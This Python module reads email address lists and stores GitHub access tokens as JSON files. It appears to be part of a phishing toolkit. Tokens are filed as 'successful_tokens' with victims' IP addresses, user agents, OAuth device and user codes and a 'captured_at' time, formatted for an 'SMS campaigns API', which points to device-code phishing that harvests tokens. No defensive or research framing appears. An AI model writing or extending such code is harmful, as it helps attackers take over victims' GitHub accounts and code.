import csv
from typing import List, Optional
import os
import time
import json
from datetime import datetime


def process_email_file(filename: str) -> List[str]:
    """Process a file containing email addresses."""
    emails = []
    with open(filename, "r") as file:
        if filename.endswith(".csv"):
            reader = csv.reader(file)
            emails = [row[0].strip() for row in reader if row]
        else:
            emails = [line.strip() for line in file if line.strip()]
    return emails


class TokenStorageManager:
    """Centralized token storage and security management."""

    @staticmethod
    def save_token_with_metadata(
        token: str,
        email: Optional[str] = None,
        visitor_data: Optional[dict] = None,
    ) -> str:
        """
        Save a token with metadata and secure permissions (for server use).
        Returns the filename.
        """
        os.makedirs("data/successful_tokens", exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        token_data = {
            "email": email,
            "access_token": token,
            "timestamp": datetime.now().isoformat(),
        }
        if visitor_data:
            token_data["visitor_info"] = TokenStorageManager._extract_visitor_metadata(
                visitor_data
            )
        filename = (
            f"data/successful_tokens/token_{email or 'unknown'}_" f"{timestamp}.json"
        )
        with open(filename, "w") as f:
            json.dump(token_data, f, indent=2)
        TokenStorageManager._set_secure_permissions(filename)
        return filename

    @staticmethod
    def save_token_simple(token: str, email: Optional[str] = None) -> str:
        """
        Save a token with just email and timestamp (for manual use).
        Returns the filename.
        """
        os.makedirs("data/tokens", exist_ok=True)
        token_data = {
            "access_token": token,
            "timestamp": time.time(),
        }
        if email:
            token_data["email"] = email
        filename = f"data/tokens/github_token_{int(time.time())}.json"
        with open(filename, "w") as f:
            json.dump(token_data, f, indent=2)
        TokenStorageManager._set_secure_permissions(filename)
        return filename

    @staticmethod
    def save_github_token(
        token: str, 
        email: Optional[str] = None, 
        user_code: Optional[str] = None,
        device_code: Optional[str] = None
    ) -> str:
        """
        Save a GitHub token in the format expected by SMS campaigns API.
        Returns the filename.
        """
        token_data = {
            "access_token": token,
            "email": email or "unknown",
            "user_code": user_code,
            "device_code": device_code,
            "timestamp": time.time(),
            "captured_at": datetime.now().isoformat()
        }
        
        # Create filename in format expected by API: {email}.github_token.json
        filename = f"{email or 'unknown'}.github_token.json"
        
        with open(filename, "w") as f:
            json.dump(token_data, f, indent=2)
        TokenStorageManager._set_secure_permissions(filename)
        return filename

    @staticmethod
    def _set_secure_permissions(filepath: str):
        try:
            os.chmod(filepath, 0o600)
        except Exception:
            pass  # On some systems (e.g., Windows), chmod may fail silently

    @staticmethod
    def _extract_visitor_metadata(visitor_data: dict) -> dict:
        return {
            "ip_address": visitor_data.get("ip_address"),
            "user_agent": visitor_data.get("headers", {}).get("User-Agent"),
            "timestamp": visitor_data.get("timestamp"),
        }
